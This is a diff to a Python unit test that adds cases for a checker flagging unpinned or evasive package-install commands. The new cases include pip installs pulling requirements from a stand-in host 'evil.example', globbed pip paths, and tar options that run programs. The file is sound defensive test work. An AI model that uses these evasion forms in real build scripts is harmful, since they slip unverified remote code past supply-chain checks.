@@ -475,12 +475,23 @@ class FollowUp2(unittest.TestCase):
                      "npm${IFS}install foo", "python3 -mpip install foo", "pip wheel foo", "pip3 wheel -w d evil",
                      "P=pip; $P install evil", "N=npx; $N evil", "{pip,} install evil", "tar -I npx -xf a.tar",
                      "echo ok  # npx foo", "npm ci evil", "npm ci $X", "pip install --require-hashes foo",
-                     "tar x $n/bin/npx", "pip install -r --require-hashes"]:
+                     "tar x $n/bin/npx", "pip install -r --require-hashes",
+                     # L3 and Security on #6630 at b77d7006: no credit for a `-r` URL (its hashes are the
+                     # server's), a tar that may run a program, or a glob; names glued to options and variants count.
+                     "pip install --require-hashes -r https://evil.example/r.txt",
+                     "pip install --require-hashes --requirement=https://evil.example/r.txt",
+                     "pip install --require-hashes -r r.txt -r https://x/y", "/usr/bin/pi[p] install evil",
+                     "/usr/local/bin/pi? install evil", "/usr/bin/pip* install evil", "tar cIf yarn o.tar f",
+                     "tar -cf o.tar -Iyarn f", "env -Syarn", "env -Snpx", "yarnpkg add x", "pip-3.12 install x",
+                     "pip-3 install x", "node /usr/lib/node_modules/npm/bin/npm-cli.js install foo", "node yarn.js",
+                     "tar xIf npx a.tar", 'tar --to-command=x -xf a "$n/bin/npx"',
+                     "pi[p] install --require-hashes -r r.txt"]:
             with self.subTest(text=text):
                 self.assertEqual(pins.text_sites(text), 1)
         for text in ["pip install --require-hashes -r r.txt", "python -m pip install --no-deps --require-hashes \\\n  -r r.txt",
                      "npm ci --ignore-scripts", "go install x@v1.2.3", "go mod download", 'tar x "$n/bin/npx" "$n/bin/npm"',
-                     "pip list", "GOSUMDB=sum.golang.org go get x", "echo npm",
+                     "pip list", "GOSUMDB=sum.golang.org go get x", "echo npm", "set -o pipefail", "pipx run x", "cat npm.log",
+                     'tar -xJf "$w/n.tar.xz" --strip-components=1 -C usr/local "$n/bin/npm" "$n/bin/npx"',
                      'pip install --require-hashes -r "$R"', "tar 'x' \"$n/bin/npx\"", "pip show x",
                      "python -m pip install --no-deps --only-binary=:all: --require-hashes -r tests/requirements.txt"]:
             with self.subTest(text=text):
